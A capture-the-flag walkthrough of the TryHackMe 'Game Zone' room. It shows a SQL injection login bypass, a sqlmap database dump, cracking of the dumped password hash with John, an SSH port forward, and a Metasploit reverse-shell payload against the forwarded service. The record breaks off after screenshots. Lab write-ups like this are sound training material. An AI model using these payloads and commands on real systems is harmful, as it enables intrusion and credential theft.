---
Category: Web
LAB: https://tryhackme.com/room/gamezone
Difficulty: Easy
Featured:
aliases:
---

---
# Information / Description

Learn to hack into this machine. Understand how to use `SQLMap`, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

| `Victim IP` | 10.130.175.208 |
| ----------- | -------------- |

---

# Walkthrough

## Enumeration

First thing we will do as usual is to scan all the ports to see what services are running, and we will do this with `nmap`

```
sudo nmap -sS -sV -sC -p- -Pn -n 10.130.175.208 -T5
```

```
┌──(marc㉿martin)-[~]
└─$ sudo nmap -sS -sV -sC -p- -Pn -n 10.130.175.208 -T5
[sudo] password for marc: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-22 15:17 CEST
Nmap scan report for 10.130.175.208
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Okay so we have `ssh` and `apache`, let's start with the `apache` and see if we can enumerate some users from there.

### Apache (:80)

When we open the webserver this is what we encounter.

![](../../0.%20Assets/Game%20Zone-1784726513843.webp)


As we can see there is a `login` form, let's try to perform some `SQLinjection`

This is what a query for checking credentials might look like:

```
SELECT * FROM users WHERE username = <input> AND password = <password>
```

What if we add this payload to the `admin` user

```
' or 1=1 --
```

This is what the query would end up looking like

![](../../0.%20Assets/Game%20Zone-1784726932682.webp)

We say   `admin` or `True` (which tells the database hey this is the admin or any other user because we are basically giving it a `true` statement) then `'` to close the input and make the rest our our input part of the query and `comment` the password part so the database doesn't check for it.

![](../../0.%20Assets/Game%20Zone-1784726761317.webp)


And we are successful at login in:

![](../../0.%20Assets/Game%20Zone-1784727152112.webp)

This appears to be some kind of filter for games, and this probably checks it's data from a database, let's try to simply add `'` to see weather there is a `SQLinjection` vulnerability in the search field 
- If there is an error then we know there are no safety features (or at least they are very weak) because we are intentionally breaking the query resulting in an error.

![](../../0.%20Assets/Game%20Zone-1784727274571.webp)

Bingo!

Let's dump the database with `SQLmap` for this we first need the field names of the HTML that are then sent to the database so we can tell `SQLmap` where to input it's payloads.

To do this in an easy way we will use `burpsuite` to capture the `request` and then use it with `SQLmap`

![](../../0.%20Assets/Game%20Zone-1784727414425.webp)

Great now that we have the request, let's save it into a file called `request`

![](../../0.%20Assets/Game%20Zone-1784727489652.webp)

now let's use ``sqlmap`` to dump the database

```
sudo sqlmap -r request.txt --dbms=mysql --dump
```

- `-r` -> takes the request file
- `--dbms` -> specify the type of database (we know it's `mysql` because when we where doing the login testing we used `--` as a comment and that is from `mysql`)
- `--dump` -> We kindly ask `sqlmap` to dump the entire database

![](../../0.%20Assets/Game%20Zone-1784727712148.webp)

And it found 2 tables

Great not only we were able to extract all the game titles:

![](../../0.%20Assets/Game%20Zone-1784727823943.webp)

But also credentials (The password seems to be `encrypted`)

![](../../0.%20Assets/Game%20Zone-1784727817565.webp)

| `User`  | `Password`                                                       |
| ------- | ---------------------------------------------------------------- |
| agent47 | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6cOc6218f04122c3efd14 |

After some reading the password appears to be a `sha256 hash` so we will use `john the reaper`

To do this add the hash to a file called `hash.txt` for instance

![](../../0.%20Assets/Game%20Zone-1784728287613.webp)

And then we will use the following command

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
```



![](../../0.%20Assets/Game%20Zone-1784728279971.webp)

Let's use this credentials to log in `ssh`

![](../../0.%20Assets/Game%20Zone-1784729741472.webp)

![](../../0.%20Assets/Game%20Zone-1784729751709.webp)

```user-flag
649ac17b1480ac13ef1e4fa579dac95c
```


![](../../0.%20Assets/Game%20Zone-1784730083655.webp)

We can see there is a weird port open `10000`

Let's use `reverse ssh tunels` to see what's behind the port

```
ssh -N -L 10000:localhost:10000 agent47@10.130.175.208
```

while this is open look for

```
http://localhost:10000
```

![](../../0.%20Assets/Game%20Zone-1784730531611.webp)

I did an nmap to figure out what this is

![](../../0.%20Assets/Game%20Zone-1784730651469.webp)


And we search for exploits in `metasploit`

![](../../0.%20Assets/Game%20Zone-1784730707191.webp)


```
show payloads
set payload cmd/unix/reverse
set lhost tun0
set lport 4444
set ssl false
run
```

![](../../0.%20Assets/Game%20Zone-1784730893442.webp)

![](../../0.%20Assets/Game%20Zone-1784730900537.webp)

![](../../0.%20Assets/Game%20Zone-1784730914941.webp)

``
